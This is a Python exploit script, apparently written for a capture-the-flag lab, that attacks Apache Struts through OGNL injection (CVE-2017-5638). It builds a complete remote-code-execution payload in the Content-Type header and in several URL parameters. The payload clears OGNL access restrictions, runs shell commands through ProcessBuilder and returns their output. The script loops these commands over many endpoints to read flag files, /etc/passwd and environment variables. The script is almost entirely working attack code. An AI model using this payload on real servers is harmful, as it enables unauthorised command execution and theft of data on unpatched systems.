#!/usr/bin/env python3
import requests
import sys
import re

print("[*] OGNL Injection Exploit - Final Attempt")
print("="*60)

# Base URL
base_url = "http://ognl.vulnmachines.com:8877"

# Create the OGNL payload - CVE-2017-5638
def create_payload(cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='" + cmd + "')."
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true))."
    payload += "(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"
    return payload

# Test different endpoints
endpoints = [
    "/struts-showcase",
    "/struts-showcase/",
    "/struts-showcase.action",
    "/struts-showcase/index.action",
    "/struts-showcase/showcase.action",
    "/struts-showcase/login.action",
    "/struts-showcase/help.action",
    "/struts2-showcase",
    "/struts2-showcase/",
    "/showcase",
    "/showcase/",
    "/showcase.action"
]

# Commands to execute
commands = [
    "cat /flag.txt",
    "cat flag.txt",
    "find / -name '*flag*' -type f 2>/dev/null | xargs cat 2>/dev/null",
    "ls -la /",
    "ls -la",
    "pwd",
    "cat /tmp/flag.txt",
    "cat /opt/flag.txt",
    "cat /var/www/html/flag.txt",
    "cat /home/flag.txt",
    "grep -r 'vnm{' / 2>/dev/null",
    "env | grep -i flag",
    "cat /etc/passwd | grep flag"
]

def test_endpoint(url, cmd):
    payload = create_payload(cmd)
    headers = {
        "Content-Type": payload,
        "User-Agent": "Mozilla/5.0"
    }
    
    try:
        # Try POST
        response = requests.post(url, headers=headers, timeout=10)
        
        # Check for flag
        if 'vnm{' in response.text:
            print(f"\n[!!!] FLAG FOUND at {url}")
            print(f"[!!!] Command: {cmd}")
            # Extract flag
            matches = re.findall(r'vnm\{[^}]+\}', response.text)
            for match in matches:
                print(f"[FLAG]: {match}")
            return True
            
        # Check for command output (not HTML)
        if response.status_code == 200:
            if not response.text.startswith('<!DOCTYPE') and not response.text.startswith('<html'):
                if len(response.text) < 5000 and len(response.text) > 0:
                    print(f"\n[+] Possible command output at {url}")
                    print(f"[+] Command: {cmd}")
                    print(f"Output: {response.text[:500]}")
                    return True
                    
        # Try GET as well
        response = requests.get(url, headers=headers, timeout=10)
        if 'vnm{' in response.text:
            print(f"\n[!!!] FLAG FOUND at {url} (GET)")
            matches = re.findall(r'vnm\{[^}]+\}', response.text)
            for match in matches:
                print(f"[FLAG]: {match}")
            return True
            
    except Exception as e:
        pass
    
    return False

# Test all combinations
for endpoint in endpoints:
    url = base_url + endpoint
    print(f"\n[*] Testing: {url}")
    
    for cmd in commands:
        if test_endpoint(url, cmd):
            print("\n[+] SUCCESS! Exploit worked!")
            sys.exit(0)

print("\n" + "="*60)
print("[*] Trying alternative approach with URL parameter injection...")

# Try parameter-based injection
params_payloads = [
    {"redirect": "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /flag.txt').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"},
    {"debug": "command&expression=(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /flag.txt').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))"},
    {"method": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /flag.txt').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"}
]

for endpoint in ["/struts-showcase", "/struts-showcase/"]:
    url = base_url + endpoint
    for params in params_payloads:
        try:
            r = requests.get(url, params=params, timeout=10)
            if 'vnm{' in r.text:
                print(f"\n[!!!] FLAG FOUND with parameter injection!")
                matches = re.findall(r'vnm\{[^}]+\}', r.text)
                for match in matches:
                    print(f"[FLAG]: {match}")
                sys.exit(0)
        except:
            pass

print("\n[-] Exploit attempts completed. Flag not found yet.")
print("[*] The application might be patched or using a different vulnerable endpoint.")